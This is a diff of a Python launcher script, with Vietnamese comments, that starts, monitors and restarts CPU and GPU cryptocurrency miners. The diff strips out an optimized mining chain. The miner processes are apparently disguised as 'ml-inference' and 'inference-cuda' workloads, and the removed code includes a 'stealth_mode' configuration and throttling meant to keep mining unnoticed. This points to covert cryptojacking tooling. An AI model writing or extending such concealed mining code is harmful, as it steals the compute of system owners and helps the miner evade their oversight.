@@ -50,25 +50,11 @@ LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
 os.makedirs(LOGS_DIR, exist_ok=True)
 logger = setup_logging('start_mining', str(Path(LOGS_DIR) / 'start_mining.log'), 'INFO')
 
-# **Import** (nhập) các **optimized mining components** (thành phần khai thác được tối ưu hóa) nếu có sẵn
-try:
-    from mining_environment.cpu_plugins.optimization.system_integration import (
-        integrate_with_existing_system, 
-        SystemIntegrationConfig
-    )
-    OPTIMIZED_MINING_AVAILABLE = True
-    logger.info("✅ OptimizedCalculationChain available - enhanced performance mode enabled")
-except ImportError as e:
-    OPTIMIZED_MINING_AVAILABLE = False
-    logger.info(f"ℹ️ OptimizedCalculationChain not available: {e} - using legacy mining mode")
 stop_event = threading.Event()
 process_lock = threading.Lock()
 cpu_process = None
 gpu_process = None
 
-# **Global variables** (biến toàn cục) cho **optimized mining** (khai thác được tối ưu hóa)
-optimized_integration = None
-use_optimized_mining = os.getenv('USE_OPTIMIZED_MINING', '1') == '1'
 
 def signal_handler(signum, frame):
     logger.info(f"Nhận tín hiệu dừng ({signum}). Đang dừng hệ thống khai thác...")
@@ -391,217 +377,38 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
     stop_event.set()
     return None
 
-def initialize_optimized_mining(privileged_mgr):
-    """
-    Khởi tạo **OptimizedCalculationChain** (chuỗi tính toán được tối ưu hóa) với **ml-inference process integration** (tích hợp quy trình suy luận máy học).
-    **Enhanced** (cải tiến) để khắc phục **CPU utilization 0% issue** (vấn đề sử dụng CPU 0%).
-    **EventBus Integration** (tích hợp EventBus) - PID Propagation Flow Step 3
-    """
-    global optimized_integration
-    
-    # **EventBus subscribe** (đăng ký EventBus) cho CPU PID - PID Propagation Flow Step 3
-    try:
-        from mining_environment.scripts.auxiliary_modules.event_bus import get_event_bus
-        
-        event_bus = get_event_bus()
-        # ✅ PHASE 2 REFACTORING: Migrate to new Event Naming Conventions
-        # Subscribe to new standardized format
-        event_bus.subscribe('mining:cpu_started', _on_cpu_mining_event_for_optimization)
-        # Backward compatibility: Keep legacy subscription during transition period
-        event_bus.subscribe('channel:cpu', _on_cpu_mining_event_for_optimization)
-        logger.info("✅ initialize_optimized_mining subscribed to mining:cpu_started + channel:cpu for PID integration")
-        
-    except Exception as e:
-        logger.error(f"❌ Failed to subscribe to EventBus in initialize_optimized_mining: {e}")
-        # **Fallback** - không crash optimization nếu EventBus thất bại
-    
-    if not OPTIMIZED_MINING_AVAILABLE or not use_optimized_mining:
-        logger.info("OptimizedCalculationChain not enabled, falling back to legacy mining")
-        return False
-    
-    try:
-        logger.info("Initializing OptimizedCalculationChain...")
-        
-        # Lấy configuration từ InferenceConfigService (cấu hình suy luận máy học)
-        inf_cfg = get_inference_config(process_info=None, logger=logger)
-        cores = inf_cfg.get_max_cpu_threads()
-        
-        logger.info(f"🚀 Initializing với {cores} cores cho {inf_cfg.get_cpu_process_name()}")
-        
-        # Tạo **integration config** (cấu hình tích hợp) với **stealth mode** (chế độ ẩn danh)
-        config = SystemIntegrationConfig(
-            enable_optimized_chain=True,
-            fallback_to_legacy=True,
-            throttling_compatibility=True,
-            monitoring_enabled=True,
-            auto_performance_tuning=True,
-            stealth_mode_compatible=inf_cfg.is_stealth_mode_enabled()
-        )
-        
-        # Khởi tạo **system integration** (tích hợp hệ thống)
-        optimized_integration = integrate_with_existing_system(
-            cores=cores,
-            throttling_manager=None,  # Will be injected later
-            logger=logger
-        )
-        
-        if optimized_integration:
-            # Sử dụng **enhanced mining session config** (cấu hình phiên khai thác cải tiến) từ **MLInferenceConfig**
-            from mining_environment.cpu_plugins.optimization.mining_integration_adapter import MiningSessionConfig
-            
-            # Lấy optimized config từ InferenceConfigService
-            config_data = inf_cfg.get_mining_session_config()
-            session_config = MiningSessionConfig(
-                profile=config_data["profile"],
-                total_iterations=config_data["total_iterations"],
-                batch_size=config_data["batch_size"],
-                monitoring_interval=config_data["monitoring_interval"],
-                auto_restart=config_data["auto_restart"],
-                throttling_enabled=config_data["throttling_enabled"],
-                stealth_mode=config_data["stealth_mode"]
-            )
-            
-            # Khởi động **optimized mining session** (phiên khai thác được tối ưu hóa) với **enhanced config** (cấu hình cải tiến)
-            if optimized_integration.start_optimized_mining(session_config):
-                logger.info("✅ OptimizedCalculationChain đã khởi động thành công")
-                
-                # Xác minh các **CPU workers** (tiến trình làm việc CPU) thực sự đang chạy
-                time.sleep(2)
-                status = optimized_integration.get_system_performance_status()
-                if status.get('optimized_mining_active', False):
-                    logger.info("🚀 Sử dụng OptimizedCalculationChain cho CPU mining")
-                    return True
-                else:
-                    logger.error("❌ OptimizedCalculationChain started but not active")
-                    return False
-            else:
-                logger.error("❌ Không thể khởi động OptimizedCalculationChain")
-                optimized_integration.cleanup()
-                optimized_integration = None
-                return False
-        else:
-            logger.error("❌ Không thể tạo OptimizedSystemIntegration")
-            return False
-            
-    except Exception as e:
-        logger.error(f"Lỗi khi khởi tạo OptimizedCalculationChain: {e}")
-        if optimized_integration:
-            optimized_integration.cleanup()
-            optimized_integration = None
-        return False
 
-def _on_cpu_mining_event_for_optimization(payload):
-    """Handle CPU mining events for OptimizedCalculationChain - PID Propagation Flow Step 3"""
-    try:
-        event_type = payload.get('event_type')
-        pid = payload.get('pid')
-        
-        if event_type == 'mining_started' and pid:
-            logger.info(f"⚡ OptimizedCalculationChain received CPU mining_started: PID={pid}")
-            
-            # **Gắn PID vào chuỗi tối ưu** - integrate with OptimizedCalculationChain
-            global optimized_integration
-            if optimized_integration and hasattr(optimized_integration, 'attach_to_existing_process'):
-                try:
-                    optimized_integration.attach_to_existing_process(pid)
-                    logger.info(f"✅ CPU PID {pid} attached to OptimizedCalculationChain")
-                except Exception as e:
-                    logger.error(f"❌ Failed to attach PID {pid} to OptimizedCalculationChain: {e}")
-            else:
-                logger.warning(f"⚠️ OptimizedCalculationChain not available for PID {pid} attachment")
-                
-    except Exception as e:
-        logger.error(f"❌ Error handling CPU mining event in optimization: {e}")
 
 def manage_cpu_miner(privileged_mgr, max_retries: int = 5):
     """
-    Quản lý **lifecycle** (vòng đời) của **CPU miner** (máy khai thác CPU), bao gồm **restart** (khởi động lại) và áp dụng **throttling** (điều chỉnh tốc độ).
-    **Enhanced** (cải tiến) với **OptimizedCalculationChain support** (hỗ trợ chuỗi tính toán được tối ưu hóa).
+    Quản lý **lifecycle** (vòng đời) của **CPU miner** (máy khai thác CPU) - chỉ khởi động và giám sát process.
     """
-    global cpu_process, optimized_integration
+    global cpu_process
     retries = 0
     
-    # Thử **optimized mining** (khai thác được tối ưu hóa) trước tiên
-    if initialize_optimized_mining(privileged_mgr):
-        logger.info("🚀 Sử dụng OptimizedCalculationChain cho CPU mining")
-        
-        # **Monitor** (giám sát) **optimized mining** (khai thác được tối ưu hóa)
-        while not stop_event.is_set() and retries < max_retries:
-            try:
-                if optimized_integration and optimized_integration.optimized_mining_active:
-                    # Lấy **performance status** (trạng thái hiệu suất)
-                    status = optimized_integration.get_system_performance_status()
-                    if status.get('optimized_mining_active', False):
-                        # **Reset retries** (đặt lại số lần thử) nếu **mining** (khai thác) đang hoạt động
-                        retries = 0
-                        
-                        # **Log performance** (ghi nhật ký hiệu suất) theo định kỳ
-                        if status.get('mining_performance'):
-                            perf = status['mining_performance']
-                            logger.debug(f"OptimizedMining: {perf['total_cpu_utilization']:.1f}% CPU, "
-                                       f"{perf['hashrate']:.2f} H/s, {perf['active_workers']} workers")
-                            
-                            # **Log hash rate** (ghi log tốc độ băm) và **resource usage** (mức sử dụng tài nguyên)
-                            log_hash_rate("ml-inference", perf['hashrate'], {
-                                "cpu_utilization": perf['total_cpu_utilization'],
-                                "active_workers": perf['active_workers']
-                            })
-                            log_resource_usage("ml-inference")
-                    else:
-                        # **Optimized mining** (khai thác được tối ưu hóa) đã dừng, thử **restart** (khởi động lại)
-                        logger.warning("OptimizedCalculationChain stopped, attempting restart...")
-                        if not optimized_integration.start_optimized_mining():
-                            retries += 1
-                            logger.error(f"Failed to restart OptimizedCalculationChain ({retries}/{max_retries})")
-                else:
-                    # **Integration** (tích hợp) bị mất, thử **reinitialize** (khởi tạo lại)
-                    logger.warning("OptimizedSystemIntegration lost, attempting reinitialize...")
-                    if not initialize_optimized_mining(privileged_mgr):
-                        retries += 1
-                        logger.error(f"Failed to reinitialize optimized mining ({retries}/{max_retries})")
-                
-                # **Wait** (chờ) trước khi kiểm tra tiếp theo
-                stop_event.wait(30)
-                
-            except Exception as e:
-                logger.error(f"Error trong optimized mining monitoring: {e}")
-                retries += 1
-                stop_event.wait(10)
-        
-        # Nếu **optimized mining** (khai thác được tối ưu hóa) thất bại quá nhiều lần, **cleanup** (dọn dẹp) và **fallback** (quay về phương án dự phòng)
-        if retries >= max_retries:
-            logger.error("OptimizedCalculationChain thất bại quá nhiều lần, fallback to legacy mining")
-            if optimized_integration:
-                optimized_integration.cleanup()
-                optimized_integration = None
-        else:
-            # **Optimized mining** (khai thác được tối ưu hóa) hoàn thành thành công
-            return
+    # **Simple subprocess-based CPU mining** (khai thác CPU dựa trên subprocess đơn giản)
+    logger.info("🚀 Starting subprocess-based CPU mining")
     
-    # **Fallback** (quay về) **legacy mining process** (quy trình khai thác cũ)
-    logger.info("🔄 Fallback to legacy subprocess-based CPU mining")
-    retries = 0
     while not stop_event.is_set() and retries < max_retries:
         with process_lock:
             if not is_mining_process_running(cpu_process):
                 cpu_process = start_mining_process(cpu=True, privileged_manager=privileged_mgr)
-                # **Logic throttling** (logic điều chỉnh tốc độ) đã được chuyển hoàn toàn cho **CPU Plugin Framework** (khung plugin CPU)
-                # Việc gọi **setup_cpu_throttling** (thiết lập điều chỉnh CPU) đã bị loại bỏ tại đây
                 if not is_mining_process_running(cpu_process):
                     retries += 1
                     logger.warning(f"CPU miner khởi động thất bại. Thử lại... ({retries}/{max_retries})")
                 else:
-                    logger.info("CPU miner đã khởi động, việc quản lý **throttling** (điều chỉnh tốc độ) được giao cho **ResourceManager** (trình quản lý tài nguyên).")
+                    logger.info("CPU miner đã khởi động thành công.")
                     retries = 0  # Reset retries on successful start
             else:
                 # Nếu **process** (tiến trình) đang chạy, **reset retries** (đặt lại số lần thử)
                 retries = 0
                 
-                # **Log resource usage** (ghi log mức sử dụng tài nguyên) cho **legacy CPU mining** (khai thác CPU cũ)
+                # **Log resource usage** (ghi log mức sử dụng tài nguyên)
                 log_resource_usage("ml-inference")
         
         # **Wait** (đợi) trước khi kiểm tra lại
         stop_event.wait(30)
+    
     if retries >= max_retries:
         logger.error("CPU miner đã thất bại quá nhiều lần. Dừng giám sát.")
         stop_event.set()
@@ -741,16 +548,6 @@ def main():
             log_mining_operation("inference-cuda", "STOP", gpu_process.pid, 
                                 {"reason": "shutdown", "uptime": time.time()})
     
-    # **Cleanup** (dọn dẹp) **optimized mining** (khai thác được tối ưu hóa) trước tiên
-    global optimized_integration
-    if optimized_integration:
-        logger.info("Dừng OptimizedCalculationChain...")
-        try:
-            optimized_integration.cleanup()
-            optimized_integration = None
-            logger.info("✅ OptimizedCalculationChain đã dừng")
-        except Exception as e:
-            logger.error(f"Lỗi khi dừng OptimizedCalculationChain: {e}")
     
     # **Cleanup** (dọn dẹp) **legacy processes** (các tiến trình cũ)
     with process_lock:
